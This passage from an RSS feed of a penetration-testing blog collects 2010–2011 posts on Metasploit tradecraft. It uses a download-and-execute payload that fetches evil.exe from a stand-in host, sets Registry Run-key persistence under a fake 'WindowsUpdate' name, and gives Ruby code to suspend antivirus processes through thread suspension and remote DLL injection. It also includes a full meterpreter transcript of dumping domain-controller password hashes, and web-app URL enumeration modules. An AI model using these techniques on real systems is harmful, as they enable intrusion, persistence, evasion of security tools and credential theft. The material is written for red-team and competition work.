&lt;pre&gt;&lt;code&gt;osx/ppc/shell/reverse_tcp
osx/ppc/shell_reverse_tcp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The difference between these two payloads isn&amp;rsquo;t obvious other than the fact that one has an underscore &amp;lsquo;_&amp;rsquo; instead of a forward slash &amp;lsquo;/&amp;rsquo;. The one with the underscore means it&amp;rsquo;s a single while the other is staged. But the architecture of the naming convention is a bit complicated. Most stick to OS/ARCHITECTURE/TYPE/PAYLOAD where a slash instead of an underscore between TYPE and PAYLOAD would signify the difference we just talked about. But not all payloads stick to this format. You can even go crazy and actually look in the directory: msfdirectory/modules/payloads/ - everything in the singles directory.. hmmm yup, is a single.&lt;/p&gt;

&lt;p&gt;Singles are great for fire and forget, I&amp;rsquo;ve used as payloads for USB sticks (so the machine didn&amp;rsquo;t have to have a connection to do what I needed) all the way to a pretty sneaky persistence method. One that I used quite often at CCDC was with the payload: &amp;lsquo;&lt;strong&gt;windows/download_exec&lt;/strong&gt;&amp;rsquo;. The only option this single has is &amp;lsquo;URL&amp;rsquo;. We would put something like &lt;a href=&#34;http://www.redteam.com/evil.exe&#34;&gt;http://www.redteam.com/evil.exe&lt;/a&gt; and generate the binary:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201106_payloads_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;(Yes you can use msfpayload, or msfvenom on the command line to generate payloads, but I like to stay inside of msfconsole)&lt;/p&gt;

&lt;p&gt;Then set that to auto start when someone logs in with something like:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; reg setval -k &amp;quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&amp;quot; -v &amp;quot;WindowsUpdate&amp;quot; -d &amp;quot;C:\Windows\dropper.exe&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now all we had to do is wait for logins. If they happened to find our evil.exe binary (which download_exec makes it &amp;lsquo;a.exe&amp;rsquo; and puts it in System32), and blocked our IP, all we had to do in replace evil.exe on our web server and wait for it to download the new one. A crude form of persistence, but it worked well.&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;m going to end this with a list of all the payloads&amp;hellip; hopefully for all you tab completion lazy bums this might be the first time you&amp;rsquo;ve actually have taken a second to look around. In the next post I&amp;rsquo;ll be going into Meterpreter, the BEST payload in my humble-totally-unbiased opinion ;), with a bit of pivoting thrown in for good measure.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201106_payloads_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Remotely Suspend All Threads with Meterpreter</title>
      <link>https://malicious.link/post/2011/2011-05-30-remotely-suspend-all-threads-with-meterpreter/</link>
      <pubDate>Mon, 30 May 2011 21:52:59 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-05-30-remotely-suspend-all-threads-with-meterpreter/</guid>
      <description>&lt;p&gt;Just a follow up to my previous post. One of the things that sets that method apart is the fact that the suspension (once the DLL injection occurs) comes from within the process, and it suspends all the child processes as well.&lt;/p&gt;

&lt;p&gt;Another way you can do this without the injection is just sending a suspend to all the threads in the process.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;pid = 2980
targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
targetprocess.thread.each_thread do |x|
	targetprocess.thread.open(x).suspend
end
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We open the process just like we did before, and make a very simple &amp;lsquo;each_thread&amp;rsquo; loop. There are a few AVs engines that detected this as tampering. But if you target isn&amp;rsquo;t AV&amp;hellip; Say it&amp;rsquo;s Process Explorer during CCDC, this might just confuse them enough to buy you some time to do other things without their watchful eye on you.&lt;/p&gt;

&lt;p&gt;The other cool thing that happened when I did this was Process Explorer didn&amp;rsquo;t detect the process as suspended. If you looked under the thread list they were all suspended but not the process itself according to Process Explorer.&lt;/p&gt;

&lt;p&gt;Not rocket science at all, but that&amp;rsquo;s because it&amp;rsquo;s built into the framework. Just another thing that metasploit makes dead simple.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Remote DLL Injection with Meterpreter</title>
      <link>https://malicious.link/post/2011/2011-05-30-remote-dll-injection-with-meterpreter/</link>
      <pubDate>Mon, 30 May 2011 16:35:40 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-05-30-remote-dll-injection-with-meterpreter/</guid>
      <description>&lt;p&gt;Recently Didier Stevens wrote &amp;lsquo;Suspender.dll&amp;rsquo; which is a DLL that will suspend a process and all of it&amp;rsquo;s child processes after a delay. 60 seconds is it&amp;rsquo;s default but you can rename the DLL to add a number (as such &amp;lsquo;Suspender10.dll&amp;rsquo; for 10 seconds) to make the delay whatever you wish. You can find the blog post and download here: &lt;a href=&#34;http://blog.didierstevens.com/2011/04/27/suspender-dll/&#34;&gt;http://blog.didierstevens.com/2011/04/27/suspender-dll/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Jonathan Cran and I had the same idea, as I&amp;rsquo;m sure many others did as well. This might work against AntiVirus setups that protect themselves from being killed or their services stopped.&lt;/p&gt;

&lt;p&gt;I still stand by my original claim that just removing it is easier (&lt;a href=&#34;https://malicious.link/blog/2010/11/16/silently-uninstall-sep&#34;&gt;Blog Post: Silently Uninstall SEP&lt;/a&gt;). However that might be something the user notices (A little shield disappearing).&lt;/p&gt;

&lt;p&gt;Well, I didn&amp;rsquo;t know how to do this with meterpreter so a bit of google fu landed me on: &lt;a href=&#34;http://www.codeproject.com/KB/threads/winspy.aspx&#34;&gt;http://www.codeproject.com/KB/threads/winspy.aspx&lt;/a&gt; which has 3 different ways to attack the 2nd of which used a DLL (score!)&lt;/p&gt;

&lt;p&gt;Using IRB within a meterpreter shell I started using Railgun (because once you know something sometimes its easy not too look for other solutions)&lt;/p&gt;

&lt;p&gt;I start off setting up some variables after I&amp;rsquo;ve uploaded Suspender.dll:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;pid = 1436
sizeofsuspend = 52376
pathtosuspend = &amp;quot;C:\Docume~1\Administrator\Desktop\Suspender10.dll&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next up we need to open a handle on the target process:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;handle = client.railgun.kernel32.OpenProcess(PROCESS_ALL_ACCESS,false,pid)[&amp;quot;return&amp;quot;]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With the handle we allocate some memory in the remote process for our DLL to live in:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;allocatedmem = client.railgun.kernel32.VirtualAllocEx(handle,nil,sizeofsuspend,MEM_COMMIT,PAGE_READWRITE)[&amp;quot;return&amp;quot;]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Writing that DLL to memory isn&amp;rsquo;t much harder: (&lt;em&gt;&lt;strong&gt;this and the previous step is the wrong way to do things as we&amp;rsquo;ll see later&lt;/strong&gt;&lt;/em&gt;)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client.railgun.kernel32.WriteProcessMemory(handle,allocatedmem,pathtosuspend,sizeofsuspend,nil)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here is the hard part. We have to somehow figure out the address LoadLibraryA in the remote processes memory space, accounting for ASLR then pass it the location in memory where our DLL is hiding. Yah, I couldn&amp;rsquo;t figure this one out, here is the best I did:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client.railgun.kernel32.CreateRemoteThread(handle,nil,0,allocatedmem,pathtosuspend,0,nil)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then I got a friendly reminder by HD that most of this was built into meterpreter already so all that railgun nastness boils down to someting a lot simpler. Set the variables again:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;pid = 1436
pathtosuspend = &amp;quot;C:\Docume~1\Administrator\Desktop\Suspender10.dll&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;But this time we are going to use the loadlibrary payload that just got added to Metasploit Framework in &lt;a href=&#34;https://dev.metasploit.com/redmine/projects/framework/repository/revisions/12765&#34;&gt;r12765&lt;/a&gt;. We generate the payload with it pointing at our Suspender DLL:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;pay = client.framework.payloads.create(&amp;quot;windows/loadlibrary&amp;quot;)
pay.datastore[&#39;DLL&#39;] = pathtosuspend
pay.datastore[&#39;EXITFUNC&#39;] = &#39;thread&#39;
raw = pay.generate
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Open the process, this time with Rex:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Allocate the memory in the remote process write the payload (not our DLL) into that space:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;mem = targetprocess.memory.allocate(raw.length + (raw.length % 1024))
targetprocess.memory.write(mem, raw)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And finally create the remote thread.. MUCH easier (The power of Rex even over Railgun)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;targetprocess.thread.create(mem, 0)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And 10 seconds later our AV and all it&amp;rsquo;s children processes stop. Suspended by Didier&amp;rsquo;s Suspender.DLL. Thanks to HD for the slap in the head that I was doing things the wrong way and the 1 AM update to the framework that made this possible.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Dumping Hashes on Win2k8 R2 x64 with Metasploit</title>
      <link>https://malicious.link/post/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/</link>
      <pubDate>Mon, 16 May 2011 02:35:31 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/</guid>
      <description>&lt;p&gt;When trying to dump password hashes on a Windows 2008 R2 64 bit box I constantly run into the &amp;ldquo;The parameter is incorrect&amp;rdquo; error in meterpreter. So I&amp;rsquo;ve had to fall back on dropping binaries which I really don&amp;rsquo;t like doing because of the added clean up and chance of getting &amp;lsquo;caught&amp;rsquo;. Well, with a bit of migration you&amp;rsquo;ll be back to passing the hash. Here is how, with a bit of the thought process first:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;                ##                          ###           ##    ##
 ##  ##  #### ###### ####  #####   #####    ##    ####        ######
####### ##  ##  ##  ##         ## ##  ##    ##   ##  ##   ###   ##
####### ######  ##  #####   ####  ##  ##    ##   ##  ##   ##    ##
## # ##     ##  ##  ##  ## ##      #####    ##   ##  ##   ##    ##
##   ##  #### ###   #####   #####     ##   ####   ####   #### ###
                                      ##


       =[ metasploit v3.7.1-release [core:3.7 api:1.0]
+ -- --=[ 687 exploits - 364 auxiliary - 43 post
+ -- --=[ 217 payloads - 27 encoders - 8 nops
       =[ svn r12622 updated today (2011.05.15)

msf &amp;gt; 
[*] DC_IP:49220 Request received for /AYSBk...
[*] DC_IP:49220 Staging connection for target YSBk received...
[*] Patching Target ID YSBk into DLL
[*] DC_IP:49221 Request received for /BYSBk...
[*] DC_IP:49221 Stage connection for target YSBk received...
[*] Meterpreter session 7 opened (ATTACKER_IP:443 -&amp;gt; DC_IP:49221) at Sun May 15 21:37:31 +0000 2011

msf &amp;gt; sessions -i 7
[*] Starting interaction with 7...

meterpreter &amp;gt; sysinfo
System Language : en_US
OS              : Windows 2008 R2 (Build 7601, Service Pack 1).
Computer        : DOMAINCONTROLLE
Architecture    : x64 (Current Process is WOW64)
Meterpreter     : x86/win32

meterpreter &amp;gt; ps

Process list
============

 PID   Name                                       Arch  Session  User                          Path
 ---   ----                                       ----  -------  ----                          ----
 0     [System Process]                                                                        
 4     System                                     x64   0                                      
 224   smss.exe                                   x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 324   csrss.exe                                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 364   csrss.exe                                  x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 372   wininit.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 404   winlogon.exe                               x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 468   services.exe                               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 476   lsass.exe                                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 484   lsm.exe                                    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 628   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 708   svchost.exe                                x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 804   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 836   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 880   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 932   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 972   svchost.exe                                x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 328   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1172  spoolsv.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1204  Microsoft.ActiveDirectory.WebServices.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe
 1252  dfsrs.exe                                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dfsrs.exe
 1288  dns.exe                                    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dns.exe
 1316  ismserv.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\ismserv.exe
 1360  svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1392  vmtoolsd.exe                               x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 1464  wlms.exe                                   x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wlmswlms.exe
 1492  dfssvc.exe                                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dfssvc.exe
 1572  VMUpgradeHelper.exe                        x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMUpgradeHelper.exe
 1896  TPAutoConnSvc.exe                          x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe
 2016  vds.exe                                    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
 872   sppsvc.exe                                 x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
 1268  WmiPrvSE.exe                               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbemWmiPrvSE.exe
 2360  taskhost.exe                               x64   1        SITTINGDUCK\juser             C:\Windows\System32\taskhost.exe
 2424  dwm.exe                                    x64   1        SITTINGDUCK\juser             C:\Windows\System32\dwm.exe
 2452  explorer.exe                               x64   1        SITTINGDUCK\juser             C:\Windows\explorer.exe
 2504  TPAutoConnect.exe                          x64   1        SITTINGDUCK\juser             C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe
 2512  conhost.exe                                x64   1        SITTINGDUCK\juser             C:\Windows\System32\conhost.exe
 2632  VMwareTray.exe                             x64   1        SITTINGDUCK\juser             C:\Program Files\VMware\VMware Tools\VMwareTray.exe
 2640  VMwareUser.exe                             x64   1        SITTINGDUCK\juser             C:\Program Files\VMware\VMware Tools\VMwareUser.exe
 2716  mmc.exe                                    x64   1        SITTINGDUCK\juser             C:\Windows\System32\mmc.exe
 3052  mscorsvw.exe                               x86   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Frameworkv4.0.30319\mscorsvw.exe
 2216  TrustedInstaller.exe                       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
 1932  mscorsvw.exe                               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft\.NET\Framework\64\v4.0.30319\mscorsvw.exe
 2564  svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1732  msdtc.exe                                  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
 2992  notepad.exe                                x86   1        SITTINGDUCK\juser             C:\Windows\SysWOW64\notepad.exe
 1720  notepad.exe                                x64   1        SITTINGDUCK\juser             C:\Windows\System32\notepad.exe


meterpreter &amp;gt; getpid
Current pid: 2992

meterpreter &amp;gt; hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ah, the wonderful &amp;lsquo;The parameter is incorrect&amp;rsquo; error. Ok we are an admin since we can see the user for SYSTEM processes, so that isn&amp;rsquo;t the issue, but lets do a &amp;lsquo;getprivs&amp;rsquo; just in case:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getprivs    
============================================================
Enabled Process Privileges
============================================================
  SeDebugPrivilege
  SeIncreaseQuotaPrivilege
  SeMachineAccountPrivilege
  SeSecurityPrivilege
  SeTakeOwnershipPrivilege
  SeLoadDriverPrivilege
  SeSystemProfilePrivilege
  SeSystemtimePrivilege
  SeProfileSingleProcessPrivilege
  SeIncreaseBasePriorityPrivilege
  SeCreatePagefilePrivilege
  SeBackupPrivilege
  SeRestorePrivilege
  SeShutdownPrivilege
  SeSystemEnvironmentPrivilege
  SeChangeNotifyPrivilege
  SeRemoteShutdownPrivilege
  SeUndockPrivilege
  SeEnableDelegationPrivilege
  SeManageVolumePrivilege

meterpreter &amp;gt; hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Boo.. Ok, so maybe we have to be &amp;lsquo;SYSTEM&amp;rsquo;&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getsystem
...got system (via technique 1).

meterpreter &amp;gt; hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Still nothing&amp;hellip; Maybe it requires that we be in a 64 bit process&amp;hellip; PID 1720 was 64 bit version of Notepad, lets try that&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; migrate 1720
[*] Migrating to 1720...
[*] Migration completed successfully.

meterpreter &amp;gt; hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Damn, what about as &amp;lsquo;SYSTEM&amp;rsquo;&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getsystem ...got system (via technique 1).  
meterpreter &amp;gt; hashdump 
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;No joy.. hmmm What about a &amp;lsquo;SYSTEM&amp;rsquo; process that was already there.. &amp;lsquo;dns.exe&amp;rsquo; PID 1288 should be good&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; migrate 1288
[*] Migrating to 1288...
[*] Migration completed successfully.

meterpreter &amp;gt; hashdump
Administrator:500:MYLMHASH:MYNTLMHASH:::
Guest:501:MYLMHASH:MYNTLMHASH:::
krbtgtG:502:MYLMHASH:MYNTLMHASH:::
Domain Admin?:1000:MYLMHASH:MYNTLMHASH:::
juserN:1104:MYLMHASH:MYNTLMHASH:::
jane.user??:1105:MYLMHASH:MYNTLMHASH:::
DOMAINCONTROLLE$?:1001:MYLMHASH:MYNTLMHASH:::

meterpreter &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;w00t. So I don&amp;rsquo;t know why, but it seems that you have to be in a &amp;lsquo;SYSTEM&amp;rsquo; process who&amp;rsquo;s primary token (started by SYSTEM) is SYSTEM (since &amp;lsquo;getsystem&amp;rsquo; wasn&amp;rsquo;t working). I also tried this getting SYSTEM to run a 32 bit process, and was still unable to dump hashes. So next time you&amp;rsquo;re on an Win2k8 R2 64 bit box, remember to migrate into a pre-existing 64bit SYSTEM process and you should be good to go.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt; on 2011-05-15 23:39 by Rob Fuller&lt;/p&gt;

&lt;p&gt;As Gavin points out in the comments, it is better to run the meterpreter script or post module to do hashdumping on systems. The only time this is not the case is when you are trying to get domain hashes on a domain controller. The registry does not store these hashes (as far as I know). So LSASS injection is the only route and you have to jump through the mentioned hoops.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Delicious Webapp Hacking</title>
      <link>https://malicious.link/post/2010/2010-12-25-delicious-webapp-hacking/</link>
      <pubDate>Sat, 25 Dec 2010 17:00:36 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-12-25-delicious-webapp-hacking/</guid>
      <description>&lt;p&gt;&lt;strong&gt;[UPDATE]&lt;/strong&gt; This module (enum_delicious) has been pulled from Metasploit since Delicious no longer allows searching by site.&lt;/p&gt;

&lt;p&gt;In the last post I showed off how Archive.org&amp;rsquo;s Wayback machine can be used to pull urls for a domain, another place where URLs are stored and can be searched by domain is Delicious.com (a bookmarking service). I&amp;rsquo;ve seen people bookmark everything from internal web portals to urls with special no-auth passwords in them. It may even reveal subdomains and hosts you didn&amp;rsquo;t know about. This can be a very handy set of data.&lt;/p&gt;

&lt;p&gt;Be forewarned though, Delicious has been putting ads in the results and I haven&amp;rsquo;t gotten a solid regex to work on picking them out yet. So comb your results before slamming them in the requestor script from the last post. The module works basically the same way, but here it is in action:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf auxiliary(enum_delicious) &amp;gt; info
       Name: Pull Del.icio.us Links (URLs) for a domain
    Version: 11107
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  Rob Fuller

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  DOMAIN                    yes       Domain to request URLS for
  OUTFILE                   no        Where to output the list for use

Description:
  This module pulls and parses the URLs stored by Del.icio.us users 
  for the purpose of replaying during a web assessment. Finding 
  unlinked and old pages.

msf auxiliary(enum_delicious) &amp;gt; set DOMAIN portswigger.net
DOMAIN =&amp;gt; portswigger.net
msf auxiliary(enum_delicious) &amp;gt; run

[*] Pulling urls from Delicious.com
[*] Page number: 1
[*] Page number: 2
[*] Page number: 3
[*] Page number: 4
[*] Located 81 addresses for portswigger.net
http://blog.portswigger.net/
http://blog.portswigger.net/2007/04/preventing-username-enumeration.html
http://blog.portswigger.net/2007/04/using-recursive-grep-for-harvesting.html
http://blog.portswigger.net/2007/05/on-site-request-forgery.html
http://blog.portswigger.net/2007/06/viewstate-snooping.html
http://blog.portswigger.net/2007/07/dns-pinning-and-web-proxies.html
http://blog.portswigger.net/2007/07/hacking-without-credentials.html
http://blog.portswigger.net/2007/07/lame-bugs-for-rainy-day.html
http://blog.portswigger.net/2007/10/introducing-burp-sequencer.html
http://blog.portswigger.net/2007/11/new-burp-beta.html
http://blog.portswigger.net/2007/12/burp-suite-v11-released.html
http://blog.portswigger.net/2008/03/book-review-ajax-security.html
http://blog.portswigger.net/2008/03/xsrf-and-threat-ratings.html
http://blog.portswigger.net/2008/04/can-you-hit-moving-target.html
http://blog.portswigger.net/2008/05/burp-sequencer-101.html
http://blog.portswigger.net/2008/05/null-byte-attacks-are-alive-and-well.html
http://blog.portswigger.net/2008/08/attacking-parameter-names.html
http://blog.portswigger.net/2008/08/problem-accepting-self-signed-ssl.html
http://blog.portswigger.net/2008/11/mobp-burp-extender-extended.html
http://blog.portswigger.net/2008/11/mobp-filtering-and-deleting-content.html
http://blog.portswigger.net/2008/11/mobp-new-target-site-map.html
http://blog.portswigger.net/2008/11/month-of-burp-pr0n.html
http://blog.portswigger.net/2008/12/burp-suite-v12-released.html
http://blog.portswigger.net/2008/12/when-good-xsrf-defence-turns-bad.html
http://blog.portswigger.net/2009/04/intercepting-thick-client.html
http://blog.portswigger.net/2009/04/using-burp-extender.html
http://blog.portswigger.net/2009/11/if-politicians-were-http-status-codes.html
http://blog.portswigger.net/2009/11/v13p-ssl-pain-relief.html
http://blog.portswigger.net/2010/01/burp-suite-v13-released.html
http://blog.portswigger.net/2010/06/comparing-web-application-scanners-part.html
http://blog.portswigger.net/2010/06/comparing-web-application-scanners.html
http://blog.portswigger.net/search/label/MoBP
http://portswigger.net/
http://portswigger.net/books/
http://portswigger.net/burp/
http://portswigger.net/burp/downloadfree.html
http://portswigger.net/burp/help/intruder.html
http://portswigger.net/burp/help/proxy.html
http://portswigger.net/burp/proxy.html
http://portswigger.net/burp/scanner.html
http://portswigger.net/intruder/
http://portswigger.net/misc/
http://portswigger.net/misc/wahh-toc.pdf
http://portswigger.net/proxy/
http://portswigger.net/proxy/help.html
http://portswigger.net/proxy/help.html#matchreplace
http://portswigger.net/proxy/screenshots.html
http://portswigger.net/proxy/servercerts.html
http://portswigger.net/scanner/screenshots.html
http://portswigger.net/sequencer/
http://portswigger.net/spider/
http://portswigger.net/spider/help.html#using
http://portswigger.net/suite/
http://portswigger.net/suite/comparerhelp.html
http://portswigger.net/suite/download.html
http://portswigger.net/suite/download2.html
http://portswigger.net/suite/help.html#using
http://portswigger.net/suite/help.html#what
http://portswigger.net/suite/pro.html
http://portswigger.net/suite/screenshots.html
http://portswigger.net/suite/spider.html
http://portswigger.net/training/
http://portswigger.net/wahh/
http://portswigger.net/wahh/answers.html
http://portswigger.net/wahh/jattack-fuzz.java
http://portswigger.net/wahh/tasks.html
http://portswigger.net/wahh/toc.html
http://portswigger.net/wahh/tools.html
http://releases.portswigger.net/2009/08/v1214.html
http://releases.portswigger.net/2010/03/v1301.html
http://releases.portswigger.net/2010/05/v1305.html
http://releases.portswigger.net/2010/07/v1307.html
http://releases.portswigger.net/2010/08/v1308.html
http://www.portswigger.net/intruder/screenshots.html
http://www.portswigger.net/proxy/download.html
http://www.portswigger.net/scanner/
http://www.portswigger.net/sequencer/help.html
http://www.portswigger.net/spider/help.html
http://www.portswigger.net/spider/screenshots.html
http://www.portswigger.net/suite/help.html
http://www.portswigger.net/suite/successstories.html
[*] Auxiliary module execution completed
msf auxiliary(enum_delicious) &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Both this and the Wayback module can be found in the Metasploit trunk&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Wayback Webapp Hacking</title>
      <link>https://malicious.link/post/2010/2010-12-24-wayback-webapp-hacking/</link>
      <pubDate>Fri, 24 Dec 2010 19:32:56 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-12-24-wayback-webapp-hacking/</guid>
      <description>&lt;p&gt;Archive.org allows you to check the history of sites and pages, but a service most are not aware of is one that allows you to get a list of every page that a Archive.org has for a given domain. This is great for enumerating a web applications, many times you&amp;rsquo;ll find parts of web apps that have been long forgotten (and usually vulnerable).&lt;/p&gt;

&lt;p&gt;This module doesn&amp;rsquo;t make any requests to the targeted domain, it simply outputs a list to the screen/or a file of all the pages it has found on Archive.org.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf auxiliary(enum_wayback) &amp;gt; info
       Name: Pull Archive.org stored URLs for a domain
    Version: 10394
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  Rob Fuller 

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  DOMAIN   portswigger.net  yes       Domain to request URLS for
  OUTFILE                   no        Where to output the list for use

Description:
  This module pulls and parses the URLs stored by Archive.org for the 
  purpose of replaying during a web assessment. Finding unlinked and 
  old pages.

msf auxiliary(enum_wayback) &amp;gt; run

[*] Pulling urls from Archive.org
[*] Located 289 addresses for portswigger.net
http://portswigger.net/
http://portswigger.net/books/
http://portswigger.net/burp/
http://portswigger.net/burp/bullet.gif
http://portswigger.net/burp/buy.html
http://portswigger.net/burp/help.html
http://portswigger.net/burp/ps.css
http://portswigger.net/burp/screenshots.html
http://portswigger.net/burp/tc.html
http://portswigger.net/corner.gif

**SNIPPED**
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You can set the OUTFILE so that you can parse it a bit and import it into Burp, or use a quick script to make the queries yourself. Here is one I wrote in python:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;# cat requestor.py&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
import urllib
proxies = {&#39;http&#39;: &#39;http://127.0.0.1:8080&#39;}
filename = &amp;quot;/tmp/waybacklist.txt&amp;quot;

fl = open(filename, &#39;r&#39;)
for lines in fl:
	url = str(lines)
	if len(url) &amp;lt; 4:
		print &amp;quot;Skipping blank line&amp;quot;
	else:
	    print &amp;quot;Requesting &amp;quot; + url
	    temp = urllib.urlopen(url, proxies=proxies).read()
&lt;/code&gt;&lt;/pre&gt;

